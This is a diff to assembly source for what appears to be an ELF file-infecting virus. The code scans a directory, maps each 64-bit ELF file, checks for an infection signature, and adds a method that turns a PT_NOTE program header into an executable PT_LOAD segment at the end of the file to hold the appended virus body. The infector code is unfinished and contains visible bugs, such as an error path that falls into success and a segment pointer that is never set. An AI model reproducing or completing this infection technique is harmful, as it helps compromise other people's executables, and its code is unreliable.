@@ -78,7 +78,9 @@ struc	elf64_phdr
 endstruc
 
 %define PT_LOAD 1
+%define PT_NOTE 4
 %define PF_X 0x1
+%define PF_R 0x4
 
 section .text
 
@@ -234,6 +236,9 @@ treat_file:
 	%local filesize:qword				; long filesize;
 	%local mappedfile:qword				; void *mappedfile;
 	%local exec_segment:qword			; struct elf64_phdr *exec_segment;
+	%local payload_offset:qword			; long payload_offset;
+	%local next_available_vaddr:qword		; Elf64_addr next_available_vaddr;
+	%local payload_size:qword			; long payload_size;
 	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
 	%assign %$localsize %$localsize + PATH_MAX	; ...
 	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
@@ -250,7 +255,7 @@ treat_file:
 	; concat complete file path (TODO: check PATH_MAX overflow)
 	lea rdi, [pathbuf]				; dest = pathbuf;
 	mov rsi, [dirname]				; src = dirname;
-	.dirname:
+	.dirname: ; TODO : Do something with repnz instead of these 3 lines?
 		movsb					; *dest++ = *src++;
 		cmp byte [rsi], 0			; if (*src != 0)
 		jnz .dirname				; 	goto .dirname;
@@ -288,12 +293,28 @@ treat_file:
 	cmp rax, MINIMAL_FILE_SIZE			; if (filesize < MINIMAL_FILE_SIZE)
 	jl .close_err					; 	goto .close_err
 
-	; Map file
+	; Reserve file size + payload size (for PT_NOTE method)
+	; TODO Check man 2 and 3P of mmap. Not sure if I can do this
+	; https://stackoverflow.com/questions/15684771/how-to-portably-extend-a-file-accessed-using-mmap
 	mov rax, SYS_MMAP				; _ret = mmap(
 	mov rdi, 0					; 	0,
+	mov rsi, [filesize]				; 	filesize + (_end - _start),
+	add rsi, _end - _start				;	...
+	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
+	mov r10, MAP_PRIVATE | MAP_ANONYMOUS		; 	MAP_PRIVATE | MAP_ANONYMOUS,
+	mov r8, -1					; 	-1,
+	xor r9, r9					; 	0
+	syscall						; );
+	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
+	je .close_err					; 	goto .close_err
+	mov [mappedfile], rax				; mappedfile = _ret;
+
+	; Map file
+	mov rax, SYS_MMAP				; _ret = mmap(
+	mov rdi, [mappedfile]				; 	mappedfile,
 	mov rsi, [filesize]				; 	filesize,
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
-	mov r10, MAP_SHARED				; 	MAP_SHARED,
+	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
 	mov r8, [fd]					; 	fd,
 	xor r9, r9					; 	0
 	syscall						; );
@@ -315,6 +336,8 @@ treat_file:
 	mov [exec_segment], rax				; exec_segment = res;
 
 	; Check if file has signature
+	; TODO Check also with PT_NOTE method
+	; TODO Maybe put signature at other place
 	mov rdi, [mappedfile]				; has_signature(mappedfile, exec_segment);
 	mov rsi, [exec_segment]				; ...
 	call has_signature				; ...
@@ -323,10 +346,38 @@ treat_file:
 
 	; TODO: check codecave can contain payload
 	; Inject payload
-	mov rdi, [mappedfile]				; inject(mappedfile, exec_segment);
-	mov rsi, [exec_segment]				; ...
-	call inject					; ...
+; TODO: Activate this again
+;	mov rdi, [mappedfile]				; inject(mappedfile, exec_segment);
+;	mov rsi, [exec_segment]				; ...
+;	call inject					; ...
 
+	; TODO REmove comment we are doing payload_offset
+	mov rax, [filesize]				; payload_offset = filesize;
+	mov [payload_offset], rax			; ...
+
+	mov rdi, [mappedfile]
+	call get_next_available_vaddr
+	; TODO Check error
+	mov [next_available_vaddr], rax
+
+	mov rdi, _end - _start
+	mov [payload_size], rdi
+
+	; TODO: If codecave can't contains payload
+	;	try PT_NOTE method
+	; TODO Check if PT_NOTE method available
+
+	; TODO rcx peut être différent de r8 si on fait de la compression
+	; TODO Fill args
+	mov rdi, [mappedfile]				; convert_pt_note_to_load(mappedfile,
+	mov rsi, [payload_offset]			; payload_offset,
+	mov rdx, [next_available_vaddr]			; next_available_vaddr,
+	mov rcx, [payload_size]				; payload_size,
+	mov r8, [payload_size]				; payload_size,
+	call convert_pt_note_to_load			; );
+
+	; TODO Etendre le fichier + copier le payload la bas + changer le jump
+	
 	; TODO: check codecave can contain signature
 	; Sign file
 	mov rdi, [mappedfile]				; sign(mappedfile, exec_segment);
@@ -379,6 +430,67 @@ treat_file:
 	pop rbp
 	%pop
 	ret
+
+; Elf64_Addr get_next_available_vaddr(char const *file_map);
+; rax get_next_available_vaddr(rdi file_map);
+get_next_available_vaddr:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local file_map:qword				; char const *file_map;
+	%local furthest_segment_end:qword		; Elf64_Addr furthest_segment_end;
+	%local e_phoff:qword				; long e_phoff;
+	%local e_phentsize:word				; short e_phentsize;
+	%local e_phnum:word				; short e_phnum;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [file_map], rdi				; file_map = _file_map;
+	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr->e_phoff;
+	mov [e_phoff], rax				; ...
+	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr->e_phentsize;
+	mov [e_phentsize], ax				; ...
+	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr->e_phnum;
+	mov [e_phnum], ax				; ...
+
+	mov QWORD [furthest_segment_end], 0
+
+	; loop through program headers
+	mov si, 0					; i = 0;
+	.begin_phdr_loop:				; do {
+		mov rax, [file_map]			; _cur_phdr = file_map
+		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
+		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
+		imul rcx, rsi				; 		...
+		add rax, rcx				; 		...
+
+		mov rdi, rax				; _cur_furthest = _cur_phdr->p_vaddr
+		add rdi, elf64_phdr.p_vaddr		; ...
+		mov r8, [rdi]				; ...
+
+		mov rdi, rax				; _cur_furthest += _cur_phdr->p_memsz
+		add rdi, elf64_phdr.p_memsz		; ...
+		add r8, [rdi]				; ...
+
+		mov r9, [furthest_segment_end]		; _furthest_segment_end = furthest_segment_end
+		cmp r8, r9				; if (_cur_furthest > _furthest_segment_end)
+		cmova r9, r8				;	_furthest_segment_end = _cur_furthest;
+		mov [furthest_segment_end], r9		; ...
+
+		inc si					; i++;
+		cmp si, [e_phnum]			; } while (i != e_phnum);
+		jne .begin_phdr_loop			; ...
+
+	mov rax, [furthest_segment_end]
+	add rsp, %$localsize
+	pop rbp
+	%pop
+	ret
+	
 
 ; int is_elf_64(char const *file_map);
 ; rax is_elf_64(rdi file_map);
@@ -452,6 +564,72 @@ find_exec_segment:
 		mov ax, [rdi]				; ...
 		and ax, PF_X				; ...
 		cmp ax, PF_X				; ...
+		jne .next_phdr_loop			; 	goto next_phdr_loop;
+
+		jmp .found				; goto found;
+
+	.next_phdr_loop:
+		add rsi, 1				; i++;
+		cmp rsi, [e_phnum]			; if (i == e_phnum)
+		je .not_found				; 	goto not_found;
+		jmp .begin_phdr_loop			; }
+
+	.not_found:
+		xor rax, rax				; res = 0;
+		jmp .end				; goto end
+
+	.found:
+		mov rax, [res_header]			; res = res_header;
+		jmp .end				; goto end
+
+.end:
+	add rsp, %$localsize
+	pop rbp
+	%pop
+	ret
+
+; TODO Optimize with find_exec_segment
+;elf64_phdr *find_note_segment(char const *_file_map)
+;rax find_note_segment(rdi file_map);
+find_note_segment:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local file_map:qword				; char const *file_map;
+	%local res_header:qword				; elf64_phdr *res_header;
+	%local e_phoff:qword				; long e_phoff;
+	%local e_phentsize:qword			; long e_phentsize;
+	%local e_phnum:qword				; long e_phnum;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [file_map], rdi				; file_map = _file_map;
+	mov ax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
+	mov [e_phoff], rax				; ...
+	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
+	mov [e_phentsize], rax				; ...
+	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
+	mov [e_phnum], rax				; ...
+
+	; loop through program headers
+	mov rsi, 0					; i = 0;
+	.begin_phdr_loop:				; while (true) {
+		mov rax, [file_map]			; cur_phdr = file_map
+		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
+		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
+		imul rcx, rsi				; 		...
+		add rax, rcx				; 		...
+		mov [res_header], rax			; res_header = cur_phdr;
+
+		; check if PT_NOTE
+		mov rdi, [res_header]			; if (cur_phdr->p_type != PT_LOAD)
+		add rdi, elf64_phdr.p_type		; ...
+		mov eax, [rdi]				; ...
+		cmp eax, PT_NOTE			; ...
 		jne .next_phdr_loop			; 	goto next_phdr_loop;
 
 		jmp .found				; goto found;
@@ -609,6 +787,117 @@ inject:
 	pop rbp
 	%pop
 	ret
+
+; bool convert_pt_note_to_load(char const *_file_map,
+;			       Elf64_Off _new_offset,
+;			       Elf64_Addr _new_vaddr,
+;			       uint64_t _filesz,
+;			       uint64_t _memsz)
+; bool convert_pt_note_to_load(rdi _file_map,
+;			       rsi _new_offset,
+;			       rdx _new_vaddr,
+;			       rcx _filesz,
+;			       r8 _memsz);
+; TODO: _memsz Will be useful if we do compression. Else, this parameter is equal to _filesz
+convert_pt_note_to_load:
+	; TODO Search for a PT_NOTE segment
+	; Comment trouver un PT_NOTE segment ?
+	; ELF Header->e_phoff -> offset of program header table
+	; ELF Header->e_phentsize -> Size of a program header
+	; ELF Header->e_phnum -> Number of program header
+	; So, j'ai juste à faire une boucle qui part de e_phoff, et va e_phnum fois,
+	; parcourir des entrées de taille e_phentsize
+	; Direct quand je suis dans le segment, je check son type : il faut que ce soit un PT_NOTE
+	; Si oui je continue, sinon je boucle
+	; Je change les flags pour avoir R E
+	; Changer p_offset pour la fin du fichier (on va mettre le segment à la toute fin)
+	; Changer p_vaddr pour faire en sorte que ça soit foutu dans un endroit où y'a rien 
+	;	2 méthodes :
+	;		mettre très loin un peu au hasard
+	; 		aller lire tous les segments pour voir où ils sont situés (on cherche
+	;			l'offset le plus haut et on ajoute sa taille)
+	; p_filesz: Taille de notre payload
+	; p_memsz: Taille de notre payload (peut changer si jamais on part sur de la décompression
+	;	par exemple)
+	; p_align on va mettre 0x1000
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local file_map:qword				; char const *file_map;
+	%local new_offset:qword				; Elf64_Off new_offset;
+	%local new_vaddr:qword				; Elf64_Addr new_vaddr;
+	%local filesz:qword				; uint64_t filesz;
+	%local memsz:qword				; uint64_t memsz;
+	%local note_segment:qword			; elf64_phdr *note_segment;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [file_map], rdi				; file_map = _file_map;
+	mov [new_offset], rsi				; new_offset = _new_offset;
+	mov [new_vaddr], rdx				; new_vaddr = _new_vaddr;
+	mov [filesz], rcx				; new_filesz = _new_filesz;
+	mov [memsz], r8					; new_memsz = _new_memsz;
+
+	call find_note_segment				; _ret = find_note_seggment(file_map);
+	cmp rax, 0					; if (_ret == NULL)
+	je .err						; 	goto .end_err;
+
+	mov rax, [note_segment]				; _note_segment = note_segment;
+
+	mov rdi, rax					; _type_ptr = &_note_segment->p_flags;
+	add rdi, elf64_phdr.p_type			; ...
+	mov DWORD [rdi], PT_LOAD			; *_type_ptr = PT_LOAD;
+
+	mov rdi, rax					; _flags_ptr = _note_segment->p_flags;
+	add rdi, elf64_phdr.p_flags			; ...
+	mov DWORD [rdi], PF_X | PF_R			; *_flags_ptr = PF_X | PF_R;
+
+	mov rdi, rax					; _offset_ptr = _note_segment->p_offset;
+	add rdi, elf64_phdr.p_offset			; ...
+	mov rsi, [new_offset]				; *_offset_ptr = new_offset;
+	mov [rdi], rsi					; ...
+
+	mov rdi, rax					; _vaddr_ptr = _note_segment->p_vaddr;
+	add rdi, elf64_phdr.p_vaddr			; ...
+	mov rsi, [new_vaddr]				; *_vaddr_ptr = new_vaddr;
+	mov [rdi], rsi					; ...
+
+	mov rdi, rax					; _paddr_ptr = _note_segment->p_paddr;
+	add rdi, elf64_phdr.p_paddr			; ...
+	mov rsi, [new_vaddr]				; *_paddr_ptr = new_vaddr;
+	mov [rdi], rsi					; ...
+
+	mov rdi, rax					; _filesz_ptr = _note_segment->p_filesz;
+	add rdi, elf64_phdr.p_filesz			; ...
+	mov rsi, [filesz]				; *_filesz_ptr = filesz;
+	mov [rdi], rsi					; ...
+
+	mov rdi, rax					; _memsz_ptr = _note_segment->p_memsz;
+	add rdi, elf64_phdr.p_memsz			; ...
+	mov rsi, [memsz]				; *_memsz_ptr = memsz;
+	mov [rdi], rsi					; ...
+
+	mov rdi, rax					; _align_ptr = _note_segment->p_align;
+	add rdi, elf64_phdr.p_align			; ...
+	mov QWORD [rdi], 0x1000				; *_align_ptr = 0x1000;
+
+	jmp .success
+
+.err:
+	mov rax, 0					; _ret = false;
+
+.success:
+	mov rax, 1					; _ret = true;
+
+.end:
+	add rsp, %$localsize
+	pop rbp
+	%pop
+	ret						; return _ret;
 
 ; DEBUG
 ; void print_string(char const *str);
